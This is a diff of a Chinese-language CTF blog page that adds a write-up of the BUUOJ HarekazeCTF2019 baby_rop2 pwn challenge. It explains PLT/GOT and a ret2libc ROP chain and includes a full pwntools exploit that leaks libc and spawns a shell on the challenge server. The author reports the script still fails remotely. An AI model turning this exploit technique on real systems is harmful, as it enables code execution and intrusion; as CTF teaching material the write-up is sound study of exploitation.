@@ -30,8 +30,10 @@
 <meta property="og:image" content="http://example.com/images/pwn5-5.png">
 <meta property="og:image" content="http://example.com/images/pwn6-1.png">
 <meta property="og:image" content="http://example.com/images/pwn6-2.png">
+<meta property="og:image" content="http://example.com/images/pwn10-1.png">
+<meta property="og:image" content="http://example.com/images/pwn10-2.png">
 <meta property="article:published_time" content="2023-09-18T12:24:33.000Z">
-<meta property="article:modified_time" content="2023-09-19T13:05:24.018Z">
+<meta property="article:modified_time" content="2023-09-22T07:43:45.457Z">
 <meta property="article:author" content="John Doe">
 <meta name="twitter:card" content="summary_large_image">
 <meta name="twitter:image" content="http://example.com/images/pwn5-1.png">
@@ -227,7 +229,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          4.8k 字
+          7.8k 字
         
       </span>
     
@@ -238,7 +240,7 @@
         
         
         
-          40 分钟
+          65 分钟
         
       </span>
     
@@ -330,6 +332,50 @@
 <p><img src="/images/pwn6-2.png" srcset="/img/loading.gif" lazyload></p>
 <p>跑这个脚本之前试过很多次都出现了“timeout: the monitored command dumped core”这个报错。原因是在选择libc版本时可以看到给了很多选项，我看都没看就选了第0个，怎么也打不通，后来换了第3个,问题解决</p>
 <figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">Multi</span> Results:<br> <span class="hljs-attribute">0</span>: archive-old-glibc (id libc6-amd64_2.<span class="hljs-number">24</span>-<span class="hljs-number">3</span>ubuntu2.<span class="hljs-number">2</span>_i386)<br> <span class="hljs-attribute">1</span>: archive-old-glibc (id libc6-amd64_2.<span class="hljs-number">24</span>-<span class="hljs-number">9</span>ubuntu2_i386)<br> <span class="hljs-attribute">2</span>: archive-old-glibc (id libc6-amd64_2.<span class="hljs-number">24</span>-<span class="hljs-number">9</span>ubuntu2.<span class="hljs-number">2</span>_i386)<br> <span class="hljs-attribute">3</span>: ubuntu-xenial-amd64-libc6 (id libc6_2.<span class="hljs-number">23</span>-<span class="hljs-number">0</span>ubuntu10_amd64)<br> <span class="hljs-attribute">4</span>: archive-old-glibc (id libc6-amd64_2.<span class="hljs-number">24</span>-<span class="hljs-number">3</span>ubuntu1_i386)<br></code></pre></td></tr></table></figure>
+<h2 id="例题3-https-buuoj-cn-challenges-HarekazeCTF2019-baby-rop2"><a href="#例题3-https-buuoj-cn-challenges-HarekazeCTF2019-baby-rop2" class="headerlink" title="例题3 https://buuoj.cn/challenges#[HarekazeCTF2019]baby_rop2"></a>例题3 <a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#[HarekazeCTF2019]baby_rop2">https://buuoj.cn/challenges#[HarekazeCTF2019]baby_rop2</a></h2><h3 id="题目分析-2"><a href="#题目分析-2" class="headerlink" title="题目分析"></a>题目分析</h3><p> 例行检查，64位，开启了nx保护。</p>
+<p> 运行程序有两个输入点。</p>
+<p> 拖到ida看看，<br> main函数：</p>
+ <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs cpp"> <span class="hljs-function"><span class="hljs-type">int</span> __cdecl <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-type">char</span> buf[<span class="hljs-number">28</span>]; <span class="hljs-comment">// [rsp+0h] [rbp-20h] BYREF</span><br>  <span class="hljs-type">int</span> v5; <span class="hljs-comment">// [rsp+1Ch] [rbp-4h]</span><br><br>  <span class="hljs-built_in">setvbuf</span>(stdout, <span class="hljs-number">0LL</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0LL</span>);<br>  <span class="hljs-built_in">setvbuf</span>(stdin, <span class="hljs-number">0LL</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0LL</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;What&#x27;s your name? &quot;</span>);<br>  v5 = <span class="hljs-built_in">read</span>(<span class="hljs-number">0</span>, buf, <span class="hljs-number">0x100</span>uLL);<br>  buf[v5 - <span class="hljs-number">1</span>] = <span class="hljs-number">0</span>;<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Welcome to the Pwn World again, %s!\n&quot;</span>, buf);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>buf存在栈溢出。没有可以利用的后门函数，思路还是利用read函数泄露libc地址，然后获取system和binsh的地址。<br>这道题具体用printf函数输出read函数的地址。<br>但是这里我想补充一点，因为之前做此类题目时并没有很好的理解plt got表它们的作用是什么，只是按部就班的泄露。</p>
+<p><strong>plt和got表</strong></p>
+<p>例如像 call scanf 这样一条指令，它的具体过程大概是：</p>
+<figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">call <span class="hljs-keyword">scanf </span>—&gt; <span class="hljs-keyword">scanf的plt表 </span>—&gt;<span class="hljs-keyword">scanf的got表</span><br></code></pre></td></tr></table></figure>
+<p> 结合这张图可以更好地理解：</p>
+<p> <img src="/images/pwn10-1.png" srcset="/img/loading.gif" lazyload></p>
+<p>简单来说，程序能够通过plt表找到got表中函数的地址，从而执行函数的功能。</p>
+<hr>
+<p>理解了这一点，再回到这一道题，能更好的理解利用printf函数泄露read函数的真实地址，并且在之后构建payload时也能更加清晰。</p>
+<h3 id="利用过程-1"><a href="#利用过程-1" class="headerlink" title="利用过程"></a>利用过程</h3><ul>
+<li>泄露libc地址</li>
+</ul>
+<p>这道题利用printf函数，先贴上原型：</p>
+<figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">printf</span><span class="hljs-params">( <span class="hljs-type">const</span> <span class="hljs-type">char</span>* format , [argument] ... )</span></span>;<br></code></pre></td></tr></table></figure>
+<p>有两个参数，一个是带有类似于%s这种格式的字符串，另一个就是要输出的参数。</p>
+<ol>
+<li>第一个参数直接在源程序中找了，这里就有一个。</li>
+</ol>
+<p> <img src="/images/pwn10-2.png" srcset="/img/loading.gif" lazyload></p>
+<p>str_addr&#x3D;0x0000000000400770</p>
+<ol start="2">
+<li><p>第二个参数就是需要输出的read函数地址。</p>
+</li>
+<li><p>使用ROPgadget查找rdi、rsi寄存器地址来传递参数。<br>这里查找的时候只有</p>
+<figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs gradle">$ ROPgadget --binary babyrop2 --only <span class="hljs-string">&#x27;pop|ret&#x27;</span> | <span class="hljs-keyword">grep</span> <span class="hljs-string">&#x27;rsi&#x27;</span> <br><span class="hljs-number">0</span>x0000000000400731 : <span class="hljs-keyword">pop</span> rsi ; <span class="hljs-keyword">pop</span> r15 ; ret<br><br></code></pre></td></tr></table></figure>
+<p>带着一个r15，我们用不到，所以一会直接把这个寄存器的参数设置成0好了。</p>
+</li>
+</ol>
+<p>这一步骤的payload：</p>
+<figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs smali">payload=b&#x27;A&#x27;*(0x20+8)+p64(poprdi)+p64(str_addr)+p64(pop_rsi_r15)+p64(read_got)+p64(0)+p64(print_plt)+p64(main)<br><br>解释一下，‘a’*0x28–&gt;造成溢出，覆盖到了返回地址<br>p64(pop_rdi)+p64(str_addr)–&gt;我们在原本语句的返回地址上写入了pop_rdi,ret，pop_rdi，对应参数format_str,执行后将formast_str的值设置给了rdi，之后执行ret（返回指令）<br>p64(pop_rsi_r15)+p64(read_got)+p64(0)–&gt; 我们将2中的ret写成了pop_rsi,pop_r15,ret;执行指令pop_rsi对应参数read_got,将rsi寄存器的值设置成了read函数的got表地址，pop_r15对应参数0，由于我们不用r15，随便设置一下它，我是设置成了0<br>p64(printf_plt)–&gt;将3中的ret设置成printf函数的plt表地址，实际上就是printf函数的地址，去执行printf函数，输出我们设置的read函数的地址<br>p64(main_addr)–&gt; 在完成第一次利用后，得到了程序内read函数的地址，知道了libc基址，我们需要重新回到程序开头，再次利用这个输入点去写入system‘（/bin/sh）’<br>接收输出的read函数地址<br></code></pre></td></tr></table></figure>
+<p>接收地址的指令：</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">read_addr = <span class="hljs-built_in">u64</span>(<span class="hljs-selector-tag">p</span><span class="hljs-selector-class">.recvuntil</span>(<span class="hljs-string">&#x27;\x7f&#x27;</span>)<span class="hljs-selector-attr">[-6:]</span><span class="hljs-selector-class">.ljust</span>(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\x00&#x27;</span>))<br></code></pre></td></tr></table></figure>
+<p>看其他人解释为：接收地址基本上都是7个字节的，7f开头，补全8个字节<br>就当补充个常识吧。。</p>
+<ul>
+<li>根据基址计算system binsh的地址，执行system</li>
+</ul>
+<p>后面还是熟悉的流程，直接看完整exp吧。</p>
+<h3 id="完整exp：-2"><a href="#完整exp：-2" class="headerlink" title="完整exp："></a>完整exp：</h3><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-keyword">from</span> pwn import *<br><span class="hljs-keyword">from</span> LibcSearcher import *<br><span class="hljs-attribute">r</span>=remote(&#x27;node4.buuoj.cn&#x27;,26496)<br><span class="hljs-attribute">elf</span>=ELF(&quot;./babyrop2&quot;)<br><br><span class="hljs-attribute">print_plt</span>=elf.plt[<span class="hljs-string">&quot;printf&quot;</span>]<br><span class="hljs-attribute">read_got</span>=elf.got[<span class="hljs-string">&quot;read&quot;</span>]<br><span class="hljs-attribute">main</span>=0x0000000000400636<br><span class="hljs-attribute">poprdi</span>=0x0000000000400733<br><span class="hljs-attribute">poprsi</span>=0x0000000000400731<br><span class="hljs-attribute">str_addr</span>=0x0000000000400770<br><br><span class="hljs-attribute">payload</span>=b&#x27;A&#x27;*(0x20+8)+p64(poprdi)+p64(read_got)+p64(poprsi)+p64(read_got)+p64(0)+p64(print_plt)+p64(main)<br>r.recvuntil(b<span class="hljs-string">&quot;name? &quot;</span>)<br><br>r.sendline(payload)<br>read_addr = u64(r.recvuntil(b<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-6:].ljust(8, b<span class="hljs-string">&#x27;\x00&#x27;</span>))<br><br><span class="hljs-comment">#puts_addr=u64(r.recv(8))</span><br><br><span class="hljs-attribute">libc</span>=LibcSearcher(&quot;read&quot;,read_addr)<br><span class="hljs-attribute">libcbase</span>=read_addr-libc.dump(&quot;read&quot;)<br><span class="hljs-attribute">system</span>=libcbase+libc.dump(&quot;system&quot;)<br><span class="hljs-attribute">binsh</span>=libcbase+libc.dump(&quot;str_bin_sh&quot;)<br><br><span class="hljs-attribute">payload</span>=b&#x27;A&#x27;*(0x20+8)+p64(poprdi)+p64(binsh)+p64(system)+p64(main)<br>r.recvuntil(b<span class="hljs-string">&quot;name? &quot;</span>)<br>r.sendline(payload)<br><br>r.interactive()<br><br></code></pre></td></tr></table></figure>
+<p>但是！！明明脚本没什么问题，又遇到了之前的错误timeout: the monitored command dumped core<br>这次更换libc版本也不行，百思不得其解。。。<br>这个问题如果后续解决了再补充。。。</p>
 <h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p> ret2libc：</p>
 <ul>
 <li>根据puts、write等函数泄露libc地址，注意32&#x2F;64位的区别（64位堆栈平衡问题、接收地址时是u32还是u64，接受的位数），以及write函数设置参数的问题。</li>
